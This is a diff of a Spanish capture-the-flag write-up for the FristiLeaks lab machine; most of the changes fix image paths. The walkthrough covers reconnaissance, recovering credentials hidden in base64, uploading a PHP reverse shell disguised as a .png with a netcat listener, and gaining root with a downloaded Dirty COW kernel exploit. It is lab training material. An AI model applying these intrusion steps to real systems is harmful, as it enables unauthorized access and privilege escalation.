@@ -29,7 +29,7 @@ SHA1: 4AB71D307E6D9AA3CEFE7547DDC1F987D738C596
 
 ## Resolucion de la maquina
 
-![alt text](image-5.png)
+![alt text](images/image-5.png)
 
 ## Fase de Fingerprinting / Reconocimiento (Reconnaissance): 
 
@@ -41,11 +41,11 @@ Aunque la maquina nos da una IP en la pantalla de acceso realizo un descubrimien
 sudo netdiscover -r 10.0.2.0/24 -i eth0
 ```
 
-![alt text](image-4.png)
+![alt text](images/image-4.png)
 
 Obtengo que la IP de la maquina es 10.0.2.7 que coincide con la IP que nos ofrece la maquina en su consola de acceso.
 
-![alt text](image-6.png)
+![alt text](images/image-6.png)
 
 ### Descubrimiento de puertos y servicios en el host objetivo
 
@@ -177,11 +177,11 @@ nikto -h 10.0.2.7
 
 Abro un navegador para ver la web que nos ofrece la maquina en el puerto 80
 
-![alt text](image-7.png)
+![alt text](images/image-7.png)
 
 Miro su código:
 
-![alt text](image-8.png)
+![alt text](images/image-8.png)
 
 Tomo nota del pie de web que indica que los Fristileaks son:
 
@@ -199,11 +199,11 @@ Tomo nota del pie de web que indica que los Fristileaks son:
 
 Tras varios intentos de comprobar directorios se me ocurre poner el nombre de la maquina como directorio `http://10.0.2.7/fristi/` y obtengo una pagina con un login:
 
-![alt text](image-9.png)
+![alt text](images/image-9.png)
 
 Compruebo su codigo de nuevo:
 
-![alt text](image-10.png)
+![alt text](images/image-10.png)
 
 Obtengo diferentes indicaciones o anotaciones aparentemente dejadas por el desarrollador.
 
@@ -259,27 +259,25 @@ Ya que en el codigo se habla de base64 y viendo el formato voy a pasarlo por un 
 
 Abro CiberChef y le doy como Recipe FROM Base64
 
-![alt text](upload_01a0f72bed2a5fdb6dd5936da14117c2.png) 
+![alt text](images/upload_01a0f72bed2a5fdb6dd5936da14117c2.png) 
 
 El resultado parece ser un fichero PNG, le doy a guardar y obtengo un fichero de tipo .png
 
 al abrirlo tengo 
 
-![alt text](upload_9810d8d36a93a26a82007efe68953d9e.png)
+![alt text](images/upload_9810d8d36a93a26a82007efe68953d9e.png)
 
 eezeepz puede ser usuario ya que firmaba un mensaje y los caracteres de la imagen puede ser una clave. 
 
 Lo pruebo en el login.
 
-![alt text](upload_47ae8225f775079fb640589365a22156.png)
+![alt text](images/upload_47ae8225f775079fb640589365a22156.png)
 
 Y consigo acceder e iniciar sesion.
 
-![alt text](upload_3d6c04e230de712fe46a97d9842ac96d.png)
+![alt text](images/upload_3d6c04e230de712fe46a97d9842ac96d.png)
 
 Una vez iniciado sesión vemos que podemos subir archivos .jpg , .png , .gif.
-
-
 
 Puedo usar la opcion de subir archivos para intentar añadir un fichero con una reverse shell que al ejecutarse en el servidor nos abra una conexion a nuestro equipo.
 
@@ -287,7 +285,7 @@ Para ello, ya que la maquina ejecuta un servidor apache que puede interpretar ph
 
 Accedo a https://github.com/pentestmonkey/php-reverse-shell
 
-![alt text](image-11.png)
+![alt text](images/image-11.png)
 
 Realizamos la descarga del codigo:
 
@@ -295,11 +293,11 @@ Realizamos la descarga del codigo:
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 ```
 
-![alt text](image-12.png)
+![alt text](images/image-12.png)
 
 Configuro para que cuando se ejecute abra una conexion contra mi maquina kali
 
-![alt text](image-13.png)
+![alt text](images/image-13.png)
 
 Para ello dejo a la escucha mi maquina kali mediante el comando
 
@@ -309,19 +307,19 @@ nc -nlvp 4444
 
 En la maquina objetivo solo nos deja subir archivos de tipo imagen
 
-![alt text](image-15.png)
+![alt text](images/image-15.png)
 
 Asi que cambio la extension del reverse shell dejando el archivo php-reverse-shell.php.png
 
-![alt text](image-14.png)
+![alt text](images/image-14.png)
 
 Subimos el archivo y una vez subido hacemos una navegacion hacia el archivo, 
 
-![alt text](image-16.png)
+![alt text](images/image-16.png)
 
 lo que provocara que en la maquina kali se nos abra una Shell de la maquina objetivo.
 
-![alt text](image-17.png)
+![alt text](images/image-17.png)
 
 Una vez obtenida para tener una shell completa hacemos estos pasos:
 
@@ -334,27 +332,27 @@ export TERM=xterm
 export SHELL=bash
 
 ```
-![alt text](image-19.png)
+![alt text](images/image-19.png)
 
 ## Elevacion de privilegios
 
 Compruebo la version de linux que ejecuta la maquina objetivo con el comando `uname -a`
 
-![alt text](image-20.png)
+![alt text](images/image-20.png)
 
 Obtengo que esta ejecutando un Linux 2.6.32...
 
-![alt text](image.png)
+![alt text](images/image.png)
 
 Para realizar un ataque de kernel para obtener el root directamente busco en Google si existe un exploit para ello usando el termino de busqueda:  `site:exploit-db.com Kernel Linux 2.6`
 
-![alt text](image-22.png)
+![alt text](images/image-22.png)
 
 Nos aparece un exploit que nos indica que genera una nueva linea en el fichero `/etc/passwd`
 
 Tambien puedo hacer la busqueda en exploit-db directamente.
 
-![alt text](image-21.png)
+![alt text](images/image-21.png)
 
 Una vez localizado un exploit, compruebo si lo tengo en mi maquina kali mediante el comando
 
@@ -362,11 +360,11 @@ Una vez localizado un exploit, compruebo si lo tengo en mi maquina kali mediante
 searchsploit Linux Kernel 2.6
 ```
 
-![alt text](image-23.png)
+![alt text](images/image-23.png)
 
 Y encuentro que tengo el mismo exploit que encontre en internet en mi maquina kali, asi que lo copio a mi carpeta de trabajo para poder trabajar con el si fuera necesario modificar algo.
 
-![alt text](image-24.png)
+![alt text](images/image-24.png)
 
 El exploit esta realizado en C por lo que necesito compilarlo en la maquina objetivo y ejecutarlo desde ella. 
 
@@ -376,7 +374,7 @@ Para esto levanto un servidor en mi maquina kali con el comando:
 python3 -m http.server 8080
 ```
 
-![alt text](image-1.png)
+![alt text](images/image-1.png)
 
 y ahora desde la shell de la maquina objetivo me desplazo a una carpeta que tenga opciones de escritura, normalmente suele tenerlo tmp y lo descargo con el comando
 
@@ -384,7 +382,7 @@ y ahora desde la shell de la maquina objetivo me desplazo a una carpeta que teng
 wget 10.0.2.14:8080/40839.c
 ```
 
-![alt text](image-2.png)
+![alt text](images/image-2.png)
 
 Ahora realizo la compilacion del exploit en la maquina objetivo con el comando:
 
@@ -400,18 +398,22 @@ chmod +x dirty
 
 Y ejecutamos el exploit con: `./dirty`
 
-![alt text](image-3.png)
+![alt text](images/image-3.png)
 
-me pide clave pero le pulso intro y nos crea el usuario firefart con permisos root
+Me pide clave pero le pulso intro y nos crea el usuario firefart con permisos root
 
-Tras un tiempo de procesamiento que parece que se queda bloqueado
+Tras un tiempo de procesamiento que parece que se queda bloqueado pero es solo en apariencia.
 
-![alt text](<image (2).png>)
+![alt text](images/image-25.png)
 
-Nos da un el "DONE"
+Al cabo de unos minutos, me da un el "DONE"
 
-![alt text](<image (3).png>) 
+![alt text](images/image-26.png)
 
-![alt text](<image (4).png>) 
+Compruebo y cambio de usuario al usuario firefart, sin clave ya que no pusimos ninguna clave
 
-![alt text](<image (5).png>)
+![alt text](images/image-27.png)
+
+Busco ficheros txt desde el usuario firefart y encuentro un fichero que se llama fristileaks_secrets.txt que al ver su contenido obtenemos la flag.
+
+![alt text](images/image-28.png)
